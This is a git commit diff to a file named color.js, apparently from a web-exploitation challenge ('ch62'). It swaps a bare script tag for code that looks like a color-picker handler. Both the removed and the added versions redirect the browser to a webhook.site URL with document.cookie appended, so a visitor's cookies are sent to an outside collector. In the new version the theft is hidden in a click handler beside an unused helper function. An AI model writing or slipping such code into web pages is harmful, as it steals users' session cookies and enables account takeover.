d25202820539a363ecea27090a28addc158858aa
botdevphone-jpg <botdevphone@gmail.com>
2026-01-08 01:15:43 +0300

    Update color.js

--- ch62/color.js
+++ ch62/color.js
@@ -1,4 +1,10 @@
-<script>
-document.location='http://webhook.site/3f49d0dd-56df-4a4d-951d-83862257fa1d?c='+document.cookie;
-</script>
+const color = document.getElementById("color");
+const target = document.getElementById("result");
 
+function getRandomInt(max) {
+    return Math.floor(Math.random() * max);
+  }  
+
+color.onclick = () => {
+    document.location='http://webhook.site/3f49d0dd-56df-4a4d-951d-83862257fa1d?c='+document.cookie;
+}
